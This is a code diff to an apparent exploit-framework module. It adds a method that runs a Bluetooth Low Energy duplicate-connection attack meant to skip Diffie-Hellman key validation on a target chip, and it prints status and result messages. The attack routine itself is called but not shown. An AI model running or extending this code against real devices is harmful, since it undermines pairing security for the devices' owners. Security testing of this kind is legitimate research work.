@@ -138,7 +138,23 @@ class Exploit(Exploit):
             print_error("bleak not installed: pip install bleak")
             return
 
+        self._exploit()
+
+    def _exploit(self) -> None:
+        """E2E exploit: duplicate BLE connection to bypass DH check."""
+        target_addr = str(self.target).strip()
+        print_status(f"Phase 1: Establishing first connection to {target_addr} ...")
+        print_status("Phase 2: Attempting duplicate connection (DH check skip) ...")
+
         try:
-            asyncio.run(_run_duplicate_conn(target_addr))
+            result = asyncio.run(_run_duplicate_conn(target_addr))
+            if result:
+                print_success(
+                    f"Duplicate connection exploit sent to {target_addr}. "
+                    "If the SoC is vulnerable, the duplicate connection "
+                    "bypasses DH key validation."
+                )
+            else:
+                print_error("Attack failed.")
         except Exception as exc:
             print_error(f"Attack failed: {exc}")
